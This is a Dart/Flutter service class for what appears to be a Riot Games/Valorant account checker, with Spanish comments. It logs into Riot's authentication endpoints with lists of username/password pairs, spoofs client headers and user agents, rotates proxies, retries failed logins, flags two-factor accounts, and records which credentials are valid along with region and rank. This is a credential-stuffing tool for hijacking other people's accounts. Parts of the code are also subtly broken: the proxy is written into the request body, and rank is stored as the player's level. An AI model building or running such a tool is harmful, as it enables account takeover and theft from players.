import 'dart:convert';
import 'dart:math';
import 'package:flutter/foundation.dart';
import 'package:dio/dio.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../models/account.dart';
import '../models/checker_config.dart';

class ApiService {
  static const String _prefsKeyAccessToken = 'riot_access_token';
  static const String _prefsKeyIdToken = 'riot_id_token';
  static const String _prefsKeyEntitlements = 'riot_entitlements';
  static const String _prefsKeyExpiresAt = 'riot_expires_at';

  late Dio _dio;
  late Dio _authDio;
  final CheckerConfig config;
  final List<String> _proxies;
  int _currentProxyIndex = 0;

  ApiService(this.config, this._proxies) {
    _initializeDio();
  }

  void _initializeDio() {
    _dio = Dio(
      BaseOptions(
        connectTimeout: Duration(seconds: config.requestTimeout),
        receiveTimeout: Duration(seconds: config.requestTimeout),
        headers: {
          'User-Agent': _getRandomUserAgent(),
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
          'Accept-Encoding': 'gzip, deflate, br',
          'Connection': 'keep-alive',
          'Content-Type': 'application/json',
        },
      ),
    );

    // Cliente dedicado para autenticación (sin proxy)
    _authDio = Dio(
      BaseOptions(
        connectTimeout: Duration(seconds: config.requestTimeout),
        receiveTimeout: Duration(seconds: config.requestTimeout),
        headers: {
          'User-Agent':
              'RiotClient/58.0.0.6400298.4552318 rso-auth (Windows; 10;;Professional, x64)',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
          'Accept-Encoding': 'gzip, deflate, br',
          'Connection': 'keep-alive',
          'Content-Type': 'application/json',
          'X-Riot-ClientPlatform': _clientPlatformB64(),
          'X-Riot-ClientVersion': 'release-10.0-ship',
          'X-Riot-ClientId': 'riot-client',
          'X-Requested-With': 'RiotClient',
          'Origin': 'https://auth.riotgames.com',
          'Referer': 'https://riot-client/',
        },
      ),
    );

    _setupInterceptors();
  }

  void _setupInterceptors() {
    _dio.interceptors.add(
      InterceptorsWrapper(
        onRequest: (options, handler) {
          if (_proxies.isNotEmpty) {
            _rotateProxy();
            options.data = _getCurrentProxy();
          }
          handler.next(options);
        },
      ),
    );
  }

  String _getRandomUserAgent() {
    final userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    ];
    return userAgents[Random().nextInt(userAgents.length)];
  }

  void _rotateProxy() {
    if (_proxies.isNotEmpty) {
      _currentProxyIndex = (_currentProxyIndex + 1) % _proxies.length;
    }
  }

  String? _getCurrentProxy() {
    if (_proxies.isEmpty) return null;
    return _proxies[_currentProxyIndex];
  }

  String _clientPlatformB64() {
    const platform = {
      "platformType": "PC",
      "platformOS": "Windows",
      "platformOSVersion": "10.0.19045.1.256.64bit",
      "platformChipset": "Unknown",
    };
    return base64.encode(utf8.encode(json.encode(platform)));
  }

  // Verificar si hay tokens guardados válidos
  Future<bool> _hasValidTokens() async {
    final prefs = await SharedPreferences.getInstance();
    final accessToken = prefs.getString(_prefsKeyAccessToken);
    final expiresAtStr = prefs.getString(_prefsKeyExpiresAt);

    if (accessToken == null || expiresAtStr == null) {
      return false;
    }

    final expiresAt = DateTime.parse(expiresAtStr);
    return DateTime.now().isBefore(expiresAt);
  }

  // Obtener tokens guardados
  Future<Map<String, String?>> _getSavedTokens() async {
    final prefs = await SharedPreferences.getInstance();
    return {
      'accessToken': prefs.getString(_prefsKeyAccessToken),
      'idToken': prefs.getString(_prefsKeyIdToken),
      'entitlementsToken': prefs.getString(_prefsKeyEntitlements),
    };
  }

  Future<Account> checkAccount(String username, String password) async {
    try {
      // Primero verificar si hay tokens válidos guardados
      if (await _hasValidTokens()) {
        debugPrint('Usando tokens guardados para verificar cuenta');
        return await _checkAccountWithTokens(username, password);
      } else {
        debugPrint('No hay tokens válidos, intentando autenticación directa');
        return await _checkAccountWithDirectAuth(username, password);
      }
    } catch (e) {
      debugPrint('Error verificando cuenta: $e');
      return Account(
        username: username,
        password: password,
        status: 'invalidCredentials',
        region: null,
        level: null,
        hasSkins: null,
        skinCount: null,
        errorMessage: 'Error de conexión: $e',
      );
    }
  }

  Future<Account> _checkAccountWithTokens(
    String username,
    String password,
  ) async {
    try {
      final tokens = await _getSavedTokens();
      final accessToken = tokens['accessToken'];
      final entitlementsToken = tokens['entitlementsToken'];

      if (accessToken == null || entitlementsToken == null) {
        throw Exception('Tokens incompletos');
      }

      // Usar los tokens para obtener información del jugador
      final playerInfo = await _getPlayerInfoWithTokens(
        username,
        accessToken,
        entitlementsToken,
      );

      if (playerInfo != null) {
        return Account(
          username: username,
          password: password,
          status: 'valid',
          region: playerInfo['region'],
          level: playerInfo['level'],
          hasSkins: playerInfo['hasSkins'],
          skinCount: playerInfo['skinCount'],
        );
      } else {
        // Si no se encuentra el jugador, intentar autenticación directa
        return await _checkAccountWithDirectAuth(username, password);
      }
    } catch (e) {
      debugPrint('Error con tokens guardados: $e');
      return await _checkAccountWithDirectAuth(username, password);
    }
  }

  Future<Account> _checkAccountWithDirectAuth(
    String username,
    String password,
  ) async {
    try {
      final authResult = await _authenticateRiot(username, password);

      if (authResult['type'] == 'multifactor') {
        return Account(
          username: username,
          password: password,
          status: 'twoFactor',
          region: null,
          level: null,
          hasSkins: null,
          skinCount: null,
        );
      }

      if (authResult['type'] == 'success') {
        final playerInfo = await _getPlayerInfoWithTokens(
          username,
          authResult['accessToken'],
          authResult['entitlementsToken'],
        );

        if (playerInfo != null) {
          return Account(
            username: username,
            password: password,
            status: 'valid',
            region: playerInfo['region'],
            level: playerInfo['level'],
            hasSkins: playerInfo['hasSkins'],
            skinCount: playerInfo['skinCount'],
          );
        }
      }

      return Account(
        username: username,
        password: password,
        status: 'invalidCredentials',
        region: null,
        level: null,
        hasSkins: null,
        skinCount: null,
      );
    } catch (e) {
      debugPrint('Error en autenticación directa: $e');
      return Account(
        username: username,
        password: password,
        status: 'invalidCredentials',
        region: null,
        level: null,
        hasSkins: null,
        skinCount: null,
        errorMessage: 'Error de autenticación: $e',
      );
    }
  }

  Future<Map<String, dynamic>?> _getPlayerInfoWithTokens(
    String username,
    String accessToken,
    String entitlementsToken,
  ) async {
    try {
      // Obtener información del usuario
      final userInfo = await _getUserInfo(accessToken);
      if (userInfo == null) return null;

      // Obtener información del jugador de Valorant
      final playerInfo = await _getValorantPlayerInfo(
        username,
        accessToken,
        entitlementsToken,
      );
      if (playerInfo == null) return null;

      return {
        'region': playerInfo['region'],
        'level': playerInfo['level'],
        'hasSkins': playerInfo['hasSkins'],
        'skinCount': playerInfo['skinCount'],
      };
    } catch (e) {
      debugPrint('Error obteniendo información del jugador: $e');
      return null;
    }
  }

  Future<Map<String, dynamic>?> _getUserInfo(String accessToken) async {
    try {
      final response = await _authDio.get(
        'https://auth.riotgames.com/userinfo',
        options: Options(headers: {'Authorization': 'Bearer $accessToken'}),
      );

      if (response.statusCode == 200) {
        return response.data;
      }
      return null;
    } catch (e) {
      debugPrint('Error obteniendo user info: $e');
      return null;
    }
  }

  Future<Map<String, dynamic>?> _getValorantPlayerInfo(
    String username,
    String accessToken,
    String entitlementsToken,
  ) async {
    try {
      // Obtener PUUID del usuario
      final userInfo = await _getUserInfo(accessToken);
      if (userInfo == null) return null;

      final puuid = userInfo['sub'];
      if (puuid == null) return null;

      // Obtener información del jugador de Valorant
      final response = await _authDio.get(
        'https://pd.na.a.pvp.net/mmr/v1/players/$puuid',
        options: Options(
          headers: {
            'Authorization': 'Bearer $accessToken',
            'X-Riot-Entitlements-JWT': entitlementsToken,
            'X-Riot-ClientPlatform': _clientPlatformB64(),
            'X-Riot-ClientVersion': 'release-10.0-ship',
          },
        ),
      );

      if (response.statusCode == 200) {
        final data = response.data;
        return _processPlayerInfo(data, username);
      }
      return null;
    } catch (e) {
      debugPrint('Error obteniendo información de Valorant: $e');
      return null;
    }
  }

  Map<String, dynamic> _processPlayerInfo(
    Map<String, dynamic> data,
    String username,
  ) {
    try {
      final currentSeason = data['CurrentSeason'] as Map<String, dynamic>?;
      final level = currentSeason?['RankedRating'] ?? 0;

      // Determinar región basada en el endpoint usado
      String region = 'na'; // Por defecto

      // Verificar si tiene skins (esto requeriría una llamada adicional)
      bool hasSkins = false;
      int skinCount = 0;

      return {
        'region': region,
        'level': level,
        'hasSkins': hasSkins,
        'skinCount': skinCount,
      };
    } catch (e) {
      debugPrint('Error procesando información del jugador: $e');
      return {
        'region': 'unknown',
        'level': 0,
        'hasSkins': false,
        'skinCount': 0,
      };
    }
  }

  Future<Map<String, dynamic>> _authenticateRiot(
    String username,
    String password,
  ) async {
    try {
      // Paso 1: Obtener cookies de sesión
      final cookiesResponse = await _authDio.post(
        'https://auth.riotgames.com/api/v1/authorization',
        data: {
          'client_id': 'play-valorant-web-prod',
          'response_type': 'token id_token',
          'redirect_uri': 'https://playvalorant.com/opt_in',
          'nonce': '1',
        },
      );

      if (cookiesResponse.statusCode != 200) {
        debugPrint('Error obteniendo cookies: ${cookiesResponse.statusCode}');
        return {'type': 'auth_failure'};
      }

      // Paso 2: Autenticar con credenciales usando PUT
      final authResponse = await _authDio.put(
        'https://auth.riotgames.com/api/v1/authorization',
        data: {
          'type': 'auth',
          'username': username,
          'password': password,
          'remember': true,
        },
      );

      if (authResponse.statusCode == 200) {
        final data = authResponse.data;
        debugPrint('Respuesta de autenticación: ${data['type']}');

        if (data['type'] == 'response') {
          // Autenticación exitosa
          final uri = data['response']['parameters']['uri'];
          final accessToken = _extractAccessToken(uri);

          if (accessToken != null) {
            // Obtener entitlements
            final entitlementsResponse = await _authDio.post(
              'https://entitlements.auth.riotgames.com/api/token/v1',
              options: Options(
                headers: {'Authorization': 'Bearer $accessToken'},
              ),
              data: {},
            );

            if (entitlementsResponse.statusCode == 200) {
              final entitlementsToken =
                  entitlementsResponse.data['entitlements_token'];
              return {
                'type': 'success',
                'accessToken': accessToken,
                'entitlementsToken': entitlementsToken,
              };
            }
          }
        } else if (data['type'] == 'multifactor') {
          return {'type': 'multifactor', 'requires2FA': true};
        } else if (data['type'] == 'auth_failure') {
          // Intentar con remember=false
          final retryResponse = await _authDio.put(
            'https://auth.riotgames.com/api/v1/authorization',
            data: {
              'type': 'auth',
              'username': username,
              'password': password,
              'remember': false,
            },
          );

          if (retryResponse.statusCode == 200) {
            final retryData = retryResponse.data;
            if (retryData['type'] == 'response') {
              final uri = retryData['response']['parameters']['uri'];
              final accessToken = _extractAccessToken(uri);

              if (accessToken != null) {
                final entitlementsResponse = await _authDio.post(
                  'https://entitlements.auth.riotgames.com/api/token/v1',
                  options: Options(
                    headers: {'Authorization': 'Bearer $accessToken'},
                  ),
                  data: {},
                );

                if (entitlementsResponse.statusCode == 200) {
                  final entitlementsToken =
                      entitlementsResponse.data['entitlements_token'];
                  return {
                    'type': 'success',
                    'accessToken': accessToken,
                    'entitlementsToken': entitlementsToken,
                  };
                }
              }
            }
          }

          // Si aún falla, intentar detección de 2FA
          final twoFactorResult = await _tryWebAuth(username, password);
          if (twoFactorResult) {
            return {'type': 'multifactor', 'requires2FA': true};
          }

          return {'type': 'auth_failure'};
        }
      }

      return {'type': 'auth_failure'};
    } catch (e) {
      debugPrint('Error en _authenticateRiot: $e');
      return {'type': 'auth_failure'};
    }
  }

  String? _extractAccessToken(String uri) {
    try {
      if (uri.contains('access_token=')) {
        final tokenStart = uri.indexOf('access_token=') + 13;
        var tokenEnd = uri.indexOf('&', tokenStart);
        if (tokenEnd == -1) {
          tokenEnd = uri.indexOf('#', tokenStart);
        }
        if (tokenEnd == -1) {
          tokenEnd = uri.length;
        }
        return uri.substring(tokenStart, tokenEnd);
      }
      return null;
    } catch (e) {
      debugPrint('Error extrayendo token: $e');
      return null;
    }
  }

  Future<bool> _tryWebAuth(String username, String password) async {
    try {
      final response = await _authDio.post(
        'https://auth.riotgames.com/api/v1/authorization',
        data: {
          'type': 'auth',
          'username': username,
          'password': password,
          'remember': false,
          'client_id': 'riot-client',
          'redirect_uri': 'https://auth.riotgames.com/redirect',
          'scope': 'account openid',
        },
      );

      if (response.statusCode == 200) {
        final data = response.data;
        return data['type'] == 'multifactor';
      }
      return false;
    } catch (e) {
      debugPrint('Error en _tryWebAuth: $e');
      return false;
    }
  }
}
